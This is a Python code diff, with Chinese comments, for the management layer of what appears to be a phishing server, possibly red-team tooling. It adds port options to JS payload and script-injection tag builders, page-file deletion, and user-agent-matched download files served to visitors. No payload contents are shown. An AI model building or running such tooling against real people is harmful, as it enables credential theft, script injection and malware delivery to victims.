@@ -167,23 +167,25 @@ def get_module(name: str):
         return server._builder._loader.get_module(name)
 
 
-def build_payload(name: str, args: dict, host: str = "") -> dict:
+def build_payload(name: str, args: dict, host: str = "", port=None) -> dict:
     """dry-run 构建 JS payload(不落盘)。返回 {ok, code|error}。"""
     server = get_phishing()
     if not server:
         return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
     with _PHISHING_LOCK:
-        return server._builder.build(name, args or {}, host=host or server._host_override)
+        return server._builder.build(name, args or {}, host=host or server._host_override,
+                                     port=port)
 
 
-def build_script_tag(name: str, args: dict, host: str = "") -> dict:
+def build_script_tag(name: str, args: dict, host: str = "", port=None) -> dict:
     """生成 <script src> 注入标签。"""
     server = get_phishing()
     if not server:
         return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
     with _PHISHING_LOCK:
         return server._builder.build_script_tag(name, args or {},
-                                                host=host or server._host_override)
+                                                host=host or server._host_override,
+                                                port=port)
 
 
 # ── 页面模块 ──
@@ -267,6 +269,15 @@ def delete_page(name: str):
         return server._pages.delete_page(name)
 
 
+def delete_page_file(name: str, file: str):
+    """删除页面内单个文件(白名单扩展名,防穿越)。"""
+    server = get_phishing()
+    if not server:
+        return False, "phishing 未启动"
+    with _PHISHING_LOCK:
+        return server._pages.delete_page_file(name, file)
+
+
 # ── 生命周期 / 配置 ──
 
 def start():
@@ -327,12 +338,14 @@ def update_config(updates: dict):
         ok, changed = save_config(server._config.config_path, server._config, updates)
         if not ok:
             return False, "写回 config.json 失败"
-        # active_page/default_module 内存即时生效;端口/路由需重启
+        # active_page/default_module/download_file 内存即时生效;端口/路由需重启
         cfg = server._config
         if "active_page" in changed:
             cfg.active_page = updates.get("active_page")
         if "default_module" in changed:
             cfg.default_module = str(updates.get("default_module") or "")
+        if "download_file" in changed:
+            cfg.download_file = str(updates.get("download_file") or "").strip()
         if "host" in changed:
             cfg.host = str(updates.get("host") or "")
         need_restart = any(k in changed for k in
@@ -441,3 +454,70 @@ def clear_reports():
             return True, f"已清空 {len(ids)} 条回传记录"
         except Exception as exc:
             return False, str(exc)
+
+
+# ── 下载物管理(name ↔ path/url + UA 匹配,存 downloads.json)──
+
+def list_downloads():
+    """读取下载物列表。返回 {ok, downloads|error}。"""
+    server = get_phishing()
+    if not server:
+        return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
+    try:
+        from phishing_server.downloads import load_downloads
+        return {"ok": True, "downloads": load_downloads(server._config)}
+    except Exception as exc:
+        return {"ok": False, "error": str(exc)}
+
+
+def save_downloads(downloads: list):
+    """校验并写回下载物列表。返回 {ok, message|error}。"""
+    server = get_phishing()
+    if not server:
+        return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
+    with _PHISHING_LOCK:
+        try:
+            from phishing_server.downloads import save_downloads as _save
+            ok, msg = _save(server._config, downloads)
+            return {"ok": ok, "message": msg if ok else f"保存失败: {msg}"}
+        except Exception as exc:
+            return {"ok": False, "error": str(exc)}
+
+
+# ── 共享下载目录文件(所有页面共用,下载物 /download/<file> 的来源)──
+
+def list_download_files():
+    """共享下载目录文件列表。"""
+    server = get_phishing()
+    if not server:
+        return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
+    try:
+        return {"ok": True, "files": server.list_download_files()}
+    except Exception as exc:
+        return {"ok": False, "error": str(exc)}
+
+
+def write_download_file(filename: str, content: str):
+    """上传文件到共享下载目录(FS3B64 二进制支持)。"""
+    server = get_phishing()
+    if not server:
+        return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
+    with _PHISHING_LOCK:
+        try:
+            ok, msg = server.write_download_file(filename, content)
+            return {"ok": ok, "message": msg}
+        except Exception as exc:
+            return {"ok": False, "error": str(exc)}
+
+
+def delete_download_file(filename: str):
+    """删除共享下载目录文件。"""
+    server = get_phishing()
+    if not server:
+        return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
+    with _PHISHING_LOCK:
+        try:
+            ok, msg = server.delete_download_file(filename)
+            return {"ok": ok, "message": msg}
+        except Exception as exc:
+            return {"ok": False, "error": str(exc)}
